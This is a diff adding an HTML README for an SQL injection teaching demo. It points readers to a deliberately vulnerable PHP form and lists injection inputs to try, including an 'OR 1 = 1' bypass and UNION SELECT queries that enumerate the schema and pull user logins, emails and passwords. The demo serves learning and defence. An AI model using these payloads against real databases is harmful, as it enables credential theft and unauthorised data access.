@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Readme.md</title>
+    <style></style>
+</head>
+
+<body id="preview">
+    <h2 class="code-line" data-line-start=0 data-line-end=1><a href="https://github.com/fritz-c/sql-injection-demo">SQL Injection Example Code</a></h2>
+
+    <h3 class="code-line" data-line-start=4 data-line-end=5>IMPORTANT: Do not place this code on a server that can be accessed by others.</h3>
+
+    <p class="has-line-data" data-line-start="21" data-line-end="22">Navigate to the <a href="./bad-inj.php">bad-inj.php</a> page in your browser and play around with the form.</p>
+
+    <p class="has-line-data" data-line-start="23" data-line-end="24">Here are some examples of some input to try:</p>
+    <pre><code class="has-line-data" data-line-start="26" data-line-end="38">
+ed@example.com
+
+a&quot; OR 1 = 1 -- 
+
+a&quot; UNION ALL SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES; -- 
+
+a&quot; UNION ALL SELECT COLUMN_NAME,COLUMN_TYPE from information_schema.COLUMNS where TABLE_NAME = &quot;my_users&quot;; -- 
+
+a&quot; UNION ALL SELECT user_login,user_pass from my_users; -- 
+
+a&quot; UNION ALL SELECT user_email,user_pass from my_users; -- 
+</code></pre>
+    <p class="has-line-data" data-line-start="39" data-line-end="40">And I think it goes without saying, use this knowledge for learning how to protect yourself, and for the greater good ;)</p>
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+</body>
+
+</html>
